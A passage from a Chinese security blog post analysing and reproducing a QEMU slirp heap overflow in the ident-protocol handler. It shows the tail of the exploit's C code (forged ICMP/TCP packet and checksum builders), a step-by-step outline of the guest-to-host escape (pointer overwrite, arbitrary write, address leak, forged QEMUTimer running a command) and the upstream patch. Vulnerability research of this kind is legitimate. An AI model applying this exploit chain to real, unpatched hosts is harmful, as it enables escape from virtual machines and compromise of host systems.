class="keyword">sizeof</span>(icmphdr.icmp_code));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(icmphdr.icmp_code);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(icmphdr.icmp_code);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy ICMP checksum to buf (16 bits)</span></span><br><span class="line">    <span class="comment">// Zero, since we don&#x27;t know it yet</span></span><br><span class="line">    *ptr = <span class="number">0</span>;</span><br><span class="line">    ptr++;</span><br><span class="line">    *ptr = <span class="number">0</span>;</span><br><span class="line">    ptr++;</span><br><span class="line">    chksumlen += <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy Identifier to buf (16 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;icmphdr.icmp_id, <span class="keyword">sizeof</span>(icmphdr.icmp_id));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(icmphdr.icmp_id);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(icmphdr.icmp_id);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy Sequence Number to buf (16 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;icmphdr.icmp_seq, <span class="keyword">sizeof</span>(icmphdr.icmp_seq));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(icmphdr.icmp_seq);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(icmphdr.icmp_seq);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy payload to buf</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, payload, payloadlen);</span><br><span class="line">    ptr += payloadlen;</span><br><span class="line">    chksumlen += payloadlen;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Pad to the next 16-bit boundary</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; payloadlen % <span class="number">2</span>; i++, ptr++) &#123;</span><br><span class="line">        *ptr = <span class="number">0</span>;</span><br><span class="line">        ptr++;</span><br><span class="line">        chksumlen++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> checksum((<span class="type">uint16_t</span> *)buf, chksumlen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Build IPv4 TCP pseudo-header and call checksum function.</span></span><br><span class="line"><span class="type">uint16_t</span> <span class="title function_">tcp4_checksum</span><span class="params">(<span class="keyword">struct</span> ip iphdr, <span class="keyword">struct</span> tcphdr tcphdr, <span class="type">uint8_t</span> *payload,</span></span><br><span class="line"><span class="params">                       <span class="type">int</span> payloadlen)</span> &#123;</span><br><span class="line">    <span class="type">uint16_t</span> svalue;</span><br><span class="line">    <span class="type">char</span> buf[IP_MAXPACKET], cvalue;</span><br><span class="line">    <span class="type">char</span> *ptr;</span><br><span class="line">    <span class="type">int</span> i, chksumlen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ptr points to beginning of buffer buf</span></span><br><span class="line">    ptr = &amp;buf[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy source IP address into buf (32 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;iphdr.ip_src.s_addr, <span class="keyword">sizeof</span>(iphdr.ip_src.s_addr));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(iphdr.ip_src.s_addr);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(iphdr.ip_src.s_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy destination IP address into buf (32 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;iphdr.ip_dst.s_addr, <span class="keyword">sizeof</span>(iphdr.ip_dst.s_addr));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(iphdr.ip_dst.s_addr);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(iphdr.ip_dst.s_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy zero field to buf (8 bits)</span></span><br><span class="line">    *ptr = <span class="number">0</span>;</span><br><span class="line">    ptr++;</span><br><span class="line">    chksumlen += <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy transport layer protocol to buf (8 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;iphdr.ip_p, <span class="keyword">sizeof</span>(iphdr.ip_p));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(iphdr.ip_p);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(iphdr.ip_p);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy TCP length to buf (16 bits)</span></span><br><span class="line">    svalue = htons(<span class="keyword">sizeof</span>(tcphdr) + payloadlen);</span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;svalue, <span class="keyword">sizeof</span>(svalue));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(svalue);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(svalue);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy TCP source port to buf (16 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;tcphdr.th_sport, <span class="keyword">sizeof</span>(tcphdr.th_sport));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(tcphdr.th_sport);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(tcphdr.th_sport);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy TCP destination port to buf (16 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;tcphdr.th_dport, <span class="keyword">sizeof</span>(tcphdr.th_dport));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(tcphdr.th_dport);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(tcphdr.th_dport);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy sequence number to buf (32 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;tcphdr.th_seq, <span class="keyword">sizeof</span>(tcphdr.th_seq));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(tcphdr.th_seq);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(tcphdr.th_seq);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy acknowledgement number to buf (32 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;tcphdr.th_ack, <span class="keyword">sizeof</span>(tcphdr.th_ack));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(tcphdr.th_ack);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(tcphdr.th_ack);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy data offset to buf (4 bits) and</span></span><br><span class="line">    <span class="comment">// copy reserved bits to buf (4 bits)</span></span><br><span class="line">    cvalue = (tcphdr.th_off &lt;&lt; <span class="number">4</span>) + tcphdr.th_x2;</span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;cvalue, <span class="keyword">sizeof</span>(cvalue));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(cvalue);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(cvalue);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy TCP flags to buf (8 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;tcphdr.th_flags, <span class="keyword">sizeof</span>(tcphdr.th_flags));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(tcphdr.th_flags);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(tcphdr.th_flags);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy TCP window size to buf (16 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;tcphdr.th_win, <span class="keyword">sizeof</span>(tcphdr.th_win));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(tcphdr.th_win);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(tcphdr.th_win);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy TCP checksum to buf (16 bits)</span></span><br><span class="line">    <span class="comment">// Zero, since we don&#x27;t know it yet</span></span><br><span class="line">    *ptr = <span class="number">0</span>;</span><br><span class="line">    ptr++;</span><br><span class="line">    *ptr = <span class="number">0</span>;</span><br><span class="line">    ptr++;</span><br><span class="line">    chksumlen += <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy urgent pointer to buf (16 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;tcphdr.th_urp, <span class="keyword">sizeof</span>(tcphdr.th_urp));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(tcphdr.th_urp);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(tcphdr.th_urp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy payload to buf</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, payload, payloadlen);</span><br><span class="line">    ptr += payloadlen;</span><br><span class="line">    chksumlen += payloadlen;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Pad to the next 16-bit boundary</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; payloadlen % <span class="number">2</span>; i++, ptr++) &#123;</span><br><span class="line">        *ptr = <span class="number">0</span>;</span><br><span class="line">        ptr++;</span><br><span class="line">        chksumlen++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> checksum((<span class="type">uint16_t</span> *)buf, chksumlen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocate memory for an array of chars.</span></span><br><span class="line"><span class="type">char</span> *<span class="title function_">allocate_strmem</span><span class="params">(<span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">char</span> *tmp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        dbg_printf(<span class="string">&quot;ERROR: Cannot allocate memory because len = %i in &quot;</span></span><br><span class="line">                   <span class="string">&quot;allocate_strmem().\n&quot;</span>,</span><br><span class="line">                   len);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tmp = (<span class="type">char</span> *)<span class="built_in">malloc</span>(len * <span class="keyword">sizeof</span>(<span class="type">char</span>));</span><br><span class="line">    <span class="keyword">if</span> (tmp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(tmp, <span class="number">0</span>, len * <span class="keyword">sizeof</span>(<span class="type">char</span>));</span><br><span class="line">        <span class="keyword">return</span> (tmp);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        dbg_printf(</span><br><span class="line">                <span class="string">&quot;ERROR: Cannot allocate memory for array allocate_strmem().\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocate memory for an array of unsigned chars.</span></span><br><span class="line"><span class="type">uint8_t</span> *<span class="title function_">allocate_ustrmem</span><span class="params">(<span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint8_t</span> *tmp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        dbg_printf(<span class="string">&quot;ERROR: Cannot allocate memory because len = %i in &quot;</span></span><br><span class="line">                   <span class="string">&quot;allocate_ustrmem().\n&quot;</span>,</span><br><span class="line">                   len);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tmp = (<span class="type">uint8_t</span> *)<span class="built_in">malloc</span>(len * <span class="keyword">sizeof</span>(<span class="type">uint8_t</span>));</span><br><span class="line">    <span class="keyword">if</span> (tmp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(tmp, <span class="number">0</span>, len * <span class="keyword">sizeof</span>(<span class="type">uint8_t</span>));</span><br><span class="line">        <span class="keyword">return</span> (tmp);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        dbg_printf(</span><br><span class="line">                <span class="string">&quot;ERROR: Cannot allocate memory for array allocate_ustrmem().\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocate memory for an array of ints.</span></span><br><span class="line"><span class="type">int</span> *<span class="title function_">allocate_intmem</span><span class="params">(<span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">int</span> *tmp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        dbg_printf(<span class="string">&quot;ERROR: Cannot allocate memory because len = %i in &quot;</span></span><br><span class="line">                   <span class="string">&quot;allocate_intmem().\n&quot;</span>,</span><br><span class="line">                   len);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tmp = (<span class="type">int</span> *)<span class="built_in">malloc</span>(len * <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="keyword">if</span> (tmp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(tmp, <span class="number">0</span>, len * <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">        <span class="keyword">return</span> (tmp);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        dbg_printf(</span><br><span class="line">                <span class="string">&quot;ERROR: Cannot allocate memory for array allocate_intmem().\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hexdump</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buff[<span class="number">17</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *pc = (<span class="type">unsigned</span> <span class="type">char</span> *)addr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Output description if given.</span></span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s:\n&quot;</span>, desc);</span><br><span class="line">    <span class="keyword">if</span> (len == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  ZERO LENGTH\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (len &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  NEGATIVE LENGTH: %i\n&quot;</span>, len);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Process every byte in the data.</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="comment">// Multiple of 16 means new line (with line offset).</span></span><br><span class="line">        <span class="keyword">if</span> ((i % <span class="number">16</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// Just don&#x27;t print ASCII for the zeroth line.</span></span><br><span class="line">            <span class="keyword">if</span> (i != <span class="number">0</span>)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;  %s\n&quot;</span>, buff);</span><br><span class="line">            <span class="comment">// Output the offset.</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;  %04x &quot;</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Now the hex code for the specific character.</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %02x&quot;</span>, pc[i]);</span><br><span class="line">        <span class="comment">// And store a printable ASCII character for later.</span></span><br><span class="line">        <span class="keyword">if</span> ((pc[i] &lt; <span class="number">0x20</span>) || (pc[i] &gt; <span class="number">0x7e</span>))</span><br><span class="line">            buff[i % <span class="number">16</span>] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            buff[i % <span class="number">16</span>] = pc[i];</span><br><span class="line">        buff[(i % <span class="number">16</span>) + <span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Pad out last line if not exactly 16 characters.</span></span><br><span class="line">    <span class="keyword">while</span> ((i % <span class="number">16</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// And print the final ASCII bit.</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  %s\n&quot;</span>, buff);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="漏洞调试"><a href="#漏洞调试" class="headerlink" title="漏洞调试"></a>漏洞调试</h2><p>从<code>exp</code>中我们可以看出漏洞利用的大致流程如下</p>
<ol>
<li>首先利用堆溢出将<code>m_data</code>的低二字节覆写为<code>0xb00</code>。</li>
<li>接着触发任意地址写将伪造的<code>eth+ip+icmp</code>和<code>cmd</code>字符串写入到刚刚伪造好的地址处</li>
<li>覆写<code>m_data</code>指针指向我们刚刚伪造的<code>icmp</code>数据包处</li>
<li>触发<code>icmp</code>响应，泄漏出堆地址和程序基址</li>
<li>伪造<code>qemutimer</code></li>
</ol>
<p>第一步首先需要利用堆溢出覆写<code>m_data</code>的指针的低二字节，这里我们需要申请两个相邻的堆块，其中一个是通过<code>connect</code>获取得到的<code>so-&gt;so_rcv</code>的<code>buf</code>空间大小，另一个则是<code>MF=1</code>，即数据流中第一个数据包申请得到的数据结构<code>mbuf</code>，即<code>0x670</code>大小的堆块。</p>
<p>但是这里遇到了一个问题，不知道怎么回事，申请的<code>so-&gt;so_rcv</code>和<code>mbuf</code>并没有相邻，我试了好多次发现只有一次是相邻的。待解决。</p>
<h2 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h2><p>我们可以将代码切换到版本<code>3.1.1</code>，发现其就是暴力的在<code>memcpy</code>前面加了长度的检查</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> EMU_IDENT:</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Identification protocol as per rfc-1413</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line"></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">socket</span> *<span class="title">tmpso</span>;</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span></span><br><span class="line">			<span class="type">socklen_t</span> addrlen = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in);</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">sbuf</span> *<span class="title">so_rcv</span> =</span> &amp;so-&gt;so_rcv;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (m-&gt;m_len &gt; so_rcv-&gt;sb_datalen   <span class="comment">//增加了检查</span></span><br><span class="line">					- (so_rcv-&gt;sb_wptr - so_rcv-&gt;sb_data)) &#123;</span><br><span class="line">			    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="built_in">memcpy</span>(so_rcv-&gt;sb_wptr, m-&gt;m_data, m-&gt;m_len);</span><br><span class="line">			so_rcv-&gt;sb_wptr += m-&gt;m_len;</span><br><span class="line">			so_rcv-&gt;sb_rptr += m-&gt;m_len;</span><br></pre></td></tr></table></figure>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined" rel="external nofollow noreferrer">LYYL</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://www.lyyl.online/posts/882088222.html">https://www.lyyl.online/posts/882088222.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://www.lyyl.online" target="_blank">LYYL' Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-31.jpeg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/922614085.html"><img class="prev-cover" src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-55.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">2020 starCTF 部分pwn WriteUp</div></div></a></div><div class="next-post pull-right"><a href="/posts/3399981355.html"><img class="next-cover" src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-76.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">CVE-2020-14364 QEMU 越界读写漏洞复现&amp;分析</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/favicon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">LYYL</div><div class="author-info__description">毋忧拂意，毋喜快心，毋恃久安，毋惮初难。</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/liuzhongchina521"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/liuzhongchina521" rel="external nofollow noreferrer" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:liuzhongchina521@gmail.com" rel="external nofollow noreferrer" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">博客内容为Notion导出markdown，如有错误敬请谅解。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#malloc-%E5%8E%9F%E8%AF%AD"><span class="toc-text">malloc 原语</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99"><span class="toc-text">任意地址写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%B0%E5%9D%80%E6%B3%84%E6%BC%8F"><span class="toc-text">地址泄漏</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81%E6%8E%A7%E5%88%B6%E6%B5%81"><span class="toc-text">劫持控制流</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP"><span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95"><span class="toc-text">漏洞调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#patch"><span class="toc-text">patch</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/95726211.html" title="AFL源码及流程分析"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-3.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="AFL源码及流程分析"/></a><div class="content"><a class="title" href="/posts/95726211.html" title="AFL源码及流程分析">AFL源码及流程分析</a><time datetime="2022-05-26T07:20:45.000Z" title="发表于 2022-05-26 15:20:45">2022-05-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/1029211104.html" title="V8 重新入门-2019 starCTF oob 题解"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-37.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="V8 重新入门-2019 starCTF oob 题解"/></a><div class="content"><a class="title" href="/posts/1029211104.html" title="V8 重新入门-2019 starCTF oob 题解">V8 重新入门-2019 starCTF oob 题解</a><time datetime="2021-11-05T14:20:21.000Z" title="发表于 2021-11-05 22:20:21">2021-11-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/1864456601.html" title="2021 0CTF/TCTF Final Naive Heap"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-57.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2021 0CTF/TCTF Final Naive Heap"/></a><div class="content"><a class="title" href="/posts/1864456601.html" title="2021 0CTF/TCTF Final Naive Heap">2021 0CTF/TCTF Final Naive Heap</a><time datetime="2021-09-29T02:18:50.000Z" title="发表于 2021-09-29 10:18:50">2021-09-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/2427305175.html" title="虚拟机逃逸&amp;漏洞复现"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-17.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="虚拟机逃逸&amp;漏洞复现"/></a><div class="content"><a class="title" href="/posts/2427305175.html" title="虚拟机逃逸&amp;漏洞复现">虚拟机逃逸&amp;漏洞复现</a><time datetime="2021-08-18T05:34:33.000Z" title="发表于 2021-08-18 13:34:33">2021-08-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/3705072996.html" title="2021 XCTF Final 线下WP"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-32.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2021 XCTF Final 线下WP"/></a><div class="content"><a class="title" href="/posts/3705072996.html" title="2021 XCTF Final 线下WP">2021 XCTF Final 线下WP</a><time datetime="2021-07-30T07:26:18.000Z" title="发表于 2021-07-30 15:26:18">2021-07-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By LYYL</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script 